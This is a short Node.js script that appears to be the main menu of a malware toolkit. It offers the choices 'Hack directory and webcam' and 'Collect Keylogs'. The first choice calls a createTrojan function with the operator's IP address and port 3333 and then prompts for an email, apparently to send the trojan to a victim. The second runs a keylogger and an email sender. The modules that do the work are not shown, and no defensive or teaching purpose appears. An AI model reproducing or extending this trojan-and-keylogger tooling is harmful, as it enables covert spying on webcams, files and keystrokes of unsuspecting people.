const inquirer = require("inquirer");
const { exec } = require("child_process");
const directoryHack = require("./Directory_Hack");
const keyLogger = require("./Keylogger");
const emailService = require("./helpers/Email_Service");
const Q = require("q");
const { getIp } = require("./helpers/Grab_Ip_Address");
const deferred = Q.defer();
const { emailPrompt } = require("./helpers/Email_Service");

// TODO Program should set parameters and open clien within terminal

const main = () => {
  inquirer
    .prompt([
      {
        type: "list",
        message: "Choose the action you wish to take",
        name: "action",
        choices: ["Hack directory and webcam", "Collect Keylogs"],
      },
    ])
    .then((answers) => {
      let port = "3333";
      getIp(deferred).then((ip) => {
        const address = { ip, port };
        console.log("   Using ip", ip);
        console.log("   Using port", port);

        if (answers.action === "Hack directory and webcam") {
          directoryHack.createTrojan(exec, Q, address).then(() => {
            emailPrompt(address);
          });
        } else if (answers.action === "Collect Keylogs") {
          keyLogger.hack(exec);
          emailService.send(exec);
        }
      });
    });
};

main();
